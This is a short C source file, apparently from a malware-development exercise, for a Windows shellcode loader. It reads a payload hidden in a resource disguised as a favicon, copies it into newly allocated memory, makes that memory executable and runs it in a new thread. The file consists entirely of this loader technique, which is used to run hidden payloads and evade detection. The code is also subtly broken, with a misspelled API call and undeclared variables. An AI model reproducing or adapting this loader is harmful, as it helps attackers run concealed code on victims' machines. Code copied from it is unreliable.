#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;

	// Extract payload from resource section
    res = FinResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL , res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);

	//Allocate memory for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//learn propose
	// printf("%-20s : 0x%-016p\n", "payload_addr", (void *)payload);
	// printf("%-20s : 0x%-016p\n", "calc_mem_addr", (void *)exec_mem);

	// break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make buff executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

	// if all good, execute!
	if ( rv != 0 ) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}